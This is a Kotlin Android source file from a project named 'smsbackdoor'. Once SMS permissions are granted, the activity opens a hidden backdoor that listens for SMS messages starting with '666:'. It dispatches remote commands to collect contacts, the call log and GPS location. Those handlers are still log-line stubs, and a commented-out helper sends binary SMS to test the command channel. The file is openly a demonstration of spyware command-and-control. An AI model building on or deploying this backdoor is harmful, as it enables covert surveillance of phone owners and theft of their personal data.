package com.evilthreads.smsbackdoor

import android.Manifest
import android.os.Bundle
import android.util.Log
import androidx.appcompat.app.AppCompatActivity
import com.kotlinpermissions.KotlinPermissions

class MainActivity : AppCompatActivity() {
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)
        KotlinPermissions.with(this).permissions(Manifest.permission.RECEIVE_SMS,Manifest.permission.SEND_SMS)
            .onAccepted {
                SmsBackdoor.openDoor(this, "666:"){ remoteCommand ->
                    when(remoteCommand){
                        "COMMAND_GET_CONTACTS" -> Log.d("SMS BACKDOOR", "WRITE CODE TO GET CONTACTS")
                        "COMMAND_GET_CALL_LOG" -> Log.d("SMS BACKDOOR", "WRITE CODE TO GET CALL LOG")
                        "COMMAND_GET_LOCATION" -> Log.d("SMS BACKDOOR", "WRITE CODE TO GET GPS LOCATION")
                        else -> Log.d("SMS BACKDOOR", "COMMAND NOT FOUND")
                    }
                }
            }.ask()
    }
/*
    *//*this is for testing by sending a binary sms message to ourself*//*
    private fun sendCommand(destAddr: String, commandCode: String, command: String, port: Short){
        val mgr = SmsManager.getDefault()
        val parts = mgr.divideMessage(commandCode.plus(command))
        parts.forEach {
            mgr.sendDataMessage(destAddr, null, port.toShort(), command.toByteArray(), null, null)
        }
    }*/
}